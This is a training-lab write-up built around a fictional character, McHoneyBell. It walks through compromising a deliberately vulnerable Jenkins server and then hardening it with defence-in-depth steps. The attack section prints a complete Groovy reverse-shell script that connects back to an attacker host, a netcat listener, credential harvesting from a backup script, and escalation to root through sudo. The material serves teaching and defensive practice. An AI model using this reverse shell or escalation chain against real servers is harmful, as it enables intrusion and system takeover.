**Defense in Depth**

With the chaos of the recent merger, the company's security landscape has turned into the Wild West. Servers and endpoints, once considered fortresses, now resemble neglected outposts on the frontier, vulnerable to any attacker.

As McHoneyBell sifts through the reports, a sense of urgency gnaws at her. "This is a ticking time bomb," she mutters to herself. It's clear they need a strategy, and fast.

Determined, McHoneyBell rises from her chair, her mind racing with possibilities. "Time to suit up, team. We're going deep!" she declares, her tone a blend of resolve and excitement. "Defence in Depth isn't just a strategy; it's our lifeline. We're going to fortify every layer, from the physical servers in the basement to the cloud floating above us. Every byte, every bit."

In this task, we will be hopping into McHoneyBell's shoes and exploring how the defence in depth strategy can help strengthen the environment's overall security posture.

**Learning Objectives**

- Defence in Depth
- Basic Endpoint Hardening
- Simple Boot2Root Methodology

**Guided Walkthrough of the Attack Chain**

As discussed earlier, we're dealing with a server that is vulnerable by design. It contains misconfigurations and has been implemented with poor or simply nonexistent security practices. This part of the task will walk you through one of the many ways we can get elevated privileges on the server.

Skipping the enumeration part, we can access Jenkins via Firefox on its default port: http://10.10.82.100:8080. You should be greeted by a page that looks something like this:

![jenkins](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/c79110ce-ec6d-4c08-a006-2ee3ff7d1fc2)

**Getting a Web Shell**

We instantly gain access to the general workings of Jenkins. Explore the features that we can play with, and you'll see that there's a way to Execute arbitrary scripts for administration/troubleshooting/diagnostics on the machine. On checking this further, you'll see this can be used to spawn a web shell.

Click on the Manage Jenkins button on the left side of the page. Scroll to the bottom, and you'll see the option we want: Script Console.

Script Console is a feature that accepts Groovy, a type of programming language for the Java platform. Let's jump straight in and try to establish a reverse shell using this feature! The example below is using an edited version of this script.

```
String host="attacking machine IP here";
int port=6996;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Copy the script above and paste it into the Script Console text box. Remember to change the host value to your attacking machine's IP. Open a new terminal and set up a netcat listener using this command: nc -nvlp 6996

Once both the reverse shell script and the netcat listener are ready, you can press the Run button at the bottom. You should see an established connection in your attacking terminal, and you can test the shell by sending some typical Linux commands such as id and whoami. A successful connection would look something like this:

```
root@AttackBox:~# nc -nvlp 6996
Listening on [0.0.0.0] (family 0, port 6996)
Connection from 10.10.82.100 [random port] received!
```

**Getting the tracy User and Root**

Now that we have a web shell with the Jenkins user, we can explore the server's contents for things that we can use to improve our shell and perhaps elevate our privileges.

Check the usual folders, and you'll be able to find an interesting bash script file in the /opt/scripts folder named backup.sh. Check the contents of the file. You'll find a simple implementation of backing up the essential components of Jenkins and then sending it to the folder /home/tracy/backups via scp. The file also contains the credentials of the user tracy.

The scp command is a clue that SSH may be used on the server. If so, we can use it to upgrade our user and shell. Open a new terminal and log in via SSH using the command: ssh tracy@10.10.82.100. Enter the password when prompted, and you will be logged in to the tracy account!

Finally, we can use sudo -l to find out what commands the user is permitted to perform using sudo.

```
root@AttackBox:~# ssh tracy@10.10.82.100
The authenticity of host '10.10.82.100 (MACHINE_IP)' can't be established.
--- Redacted ---
tracy@jenkins:~$ sudo -l
[sudo] password for tracy:
--- Redacted ---
User tracy may run the following commands on jenkins:
    (ALL : ALL) ALL
```

The (ALL :ALL) ALL line in the output essentially says that all commands can be performed by tracy using sudo. This means that the user is created with inherently privileged access. As such, we can just enter the command sudo su, and we're root!

**Defense in Depth and its Role in Hardening**

From the attacking point of view, we were able to get straightforward root access to the server. This is bad news for defenders since the goal is to make it as hard for the attackers as possible to get what they want.

In the next section of this task, we will establish defensive layers that aim to work together, with each layer making it more complicated for the attackers to achieve their aims. Defence in depth is all about creating defensible environments whereby security controls are meant to deter the bad actors from achieving their main goal.

Notice that the emphasis isn't on "never getting compromised"; rather, it's on making sure that the bad actors don't succeed. This way, even if one or more defensive layers get bypassed, the stacking alone of these layers makes it much harder for the bad actors. Sometimes, this is actually enough for bad actors to try and minimise their losses and move on to easier targets.

Guided Hardening of the Server
Going back to our attack exercise from earlier, we discovered that root is very easy to achieve because there is full trust within the server environment.

Removal of tracy from the Sudo Group

We should always follow the principle of least privilege, especially for systems in production. In this example, the user tracy is made in such a way that it has the same permissions as the admin. This gives the user more flexibility. However, it also runs the risk of misuse not only by the owner of the account but also by others who gain access to this account, as we did.

To remove tracy from the sudo group, we use the following command: sudo deluser tracy sudo. To confirm removal from the sudo group, use sudo -l -U tracy.

```
admin@jenkins:~$ sudo deluser tracy sudo
Removing user `tracy' from group `sudo' ...
Done.
admin@jenkins:~$ sudo -l -U tracy
User tracy is not allowed to run sudo on jenkins.
```

Changes to the tracy account won't affect current active sessions, so we can test them by logging in again as tracy on a new terminal on our attacking machine.
That change alone made all the difference between achieving root and staying with the user tracy. Now the attacker is left with three immediate options:

- Further enumerate the server for a possible route to root within the user tracy,
- Find a way to move laterally within the system to a user with a possible route to root access, or
- Find a different target.

**Hardening SSH**

The path to root has been made more complicated for the attacker, but that doesn't mean we should stop here. Attackers can be very creative in finding all sorts of ways to accomplish privilege escalation. Any additional layers will make it a lot harder for the bad actors to achieve their objectives.

Remember that as attackers, we were able to use SSH in this server to move laterally from a lower-level user. In light of this, we can disable password-based SSH logins so we can thwart the possibility of an SSH login via compromised plaintext credentials that are just lying around.

In the admin shell, go to the /etc/ssh/sshd_config file and edit it using your favourite text editor (remember to use sudo). Find the line that says #PasswordAuthentication yes and change it to PasswordAuthentication no (remove the # sign and change yes to no). Next, find the line that says Include /etc/ssh/sshd_config.d/*.conf and change it to #Include /etc/ssh/sshd_config.d/*.conf (add a # sign at the beginning). Save the file, then enter the command sudo systemctl restart ssh.

In the example below, the egrep command shows what the lines within the file should look like. You can use the same command to see if you have successfully edited the file.

You should see the effect immediately when you log out of tracy in your attacking machine and try logging in again via SSH.

```
root@jenkins:~# egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config
#Include /etc/ssh/sshd_config.d/*.conf
PasswordAuthentication no
root@jenkins:~# systemctl restart ssh
```

```
root@AttackBox:~# ssh tracy@10.10.82.100
tracy@10.10.82.100: Permission denied (publickey).
```

It's worth noting that applying this hardening step assumes that there are other ways for users to log in to the system, admin account included, and it usually involves the setup of a passwordless SSH login. However, for our purposes, we can opt not to do that anymore.

Stronger Password Policies

Another pivot point emphasised in our attack exercise earlier was the plaintext password discovery that led to the SSH access to a higher privileged user. Two immediate things are apparent here:

The password is weak and may be susceptible to a bruteforce attack, and
The user employed bad password practices, putting plaintext credentials on a script and leaving it lying around for anyone with server access to see.
We can apply a stronger password policy, requiring the user to change their password and make it compliant on their next login. However, it's solely up to the user to prevent bad password practices. Further, plaintext credentials, despite following a strong password policy, may still be used to move laterally with the web shell access that we got initially. Care really should be exercised when dealing with secrets, especially ones that belong to highly privileged accounts.

Promoting Zero Trust

Once we've applied all of the hardening steps discussed, you'll notice that we're able to patch many of the vulnerabilities that we initially exploited to get to root (in terms of the attack methodology discussed earlier, at least).

We're back in the web shell that served as our initial foothold in the system, and it's accessible as a result of a Jenkins implementation that assumes full trust within the environment. As such, it's fitting that the last hardening step we'll apply in the server is one that promotes zero trust.

Instead of opening up the workings of the platform to everyone in the environment, this change will allow just those who have access to the platform. In the admin terminal, proceed to Jenkins' home directory using the command: cd /var/lib/jenkins

Here, you will see two versions of the Jenkins config file: config.xml and config.xml.bak. Fortunately for us, the administrator kept a backup of the original configuration file before implementing the current one. As such, it would be more straightforward for us to revert it back to the original by removing the comments in the XML file. For reference, the comment syntax is signified by "!--" right after the opening bracket and "--" right before the closing bracket. Anything in between is commented out.

Using your favourite text editor, access config.xml.bak and look for the following block of lines:

```
--- Redacted ---
  <!--authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">   
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
  </authorizationStrategy-->
  <!--securityRealm class="hudson.security.HudsonPrivateSecurityRealm">  
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm-->
--- Redacted ---
```

Remove the "!--" and "--" for both authorizationStrategy and securityRealm, then save the file. We can then remove the current active config file: rm config.xml. After that, we can copy the backup file to make a new config file: cp config.xml.bak config.xml. Restart the service: sudo systemctl restart jenkins. Once that's done, you'll see that, unlike before, the inner workings of Jenkins are not accessible. It should be noted here that fresh installs of Jenkins feature a login page by default.

```
root@jenkins:~# egrep 'denyAnonymousReadAccess|disableSignup|enableCaptcha' -C1 /var/lib/jenkins/config.xml
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy"> 
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess> 
  </authorizationStrategy> 
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm"> 
    <disableSignup>true</disableSignup> 
    <enableCaptcha>false</enableCaptcha> 
  </securityRealm>
```

![sign](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/382411c8-c468-4c60-a4fd-aa00b8c30eae)

Conclusion

Defensive layers don't need to be flashy. You can accomplish a lot with one-liners and simple implementations of security best practices. This is exactly what we have done throughout this task, addressing a specific exploitable vulnerability each time.

This task is a simple demonstration of how it works in the real world. Each hardening step adds a defensive layer, and these layers work together to make a more defensible environment. Exploit one or two, and you're still relatively defensible. That's because the next layer is there to make it harder for the bad actors to succeed in getting what they want.

Defence in depth doesn't stop here, though. The next step is setting up tools and sensors that would give your defensive teams visibility over your environment, the output of which can be used to create automated detection mechanisms for suspicious behaviour. But that's a discussion for another time.

Epilogue

"Great work, team," says McHoneyBell, her eyes gleaming with pride. "We've laid down the foundations of a robust defence, but remember, this is just the beginning. The cyber world is ever-evolving, and so must we. Stay sharp, stay curious."

The team nods, a sense of accomplishment and readiness evident in their postures. They are no longer just reacting; they are anticipating, ready to tackle whatever challenges lay ahead in the ever-changing cyber terrain.

McHoneyBell grabs her jacket, her thoughts already on the next challenge. "Tomorrow, we rise again. For now, rest well, team. You've earned it."

**Q/A**


